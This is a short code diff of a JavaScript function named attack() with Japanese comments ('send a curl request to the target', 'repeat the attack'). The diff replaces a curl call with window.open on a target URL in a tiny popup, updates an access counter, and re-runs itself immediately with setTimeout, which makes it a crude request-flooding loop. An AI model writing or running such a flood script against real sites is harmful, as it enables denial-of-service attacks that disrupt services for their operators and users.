@@ -26,7 +26,7 @@ function attack() {
     $("#count").text(kaisuu + "回目のアクセス");
 
     // ターゲットにcurlリクエストを送る
-    curl(target);
+    window.open(target,null,'top=0,left=0,width=100,height=100');;
 
     // 攻撃を繰り返す
     setTimeout(attack, 0);
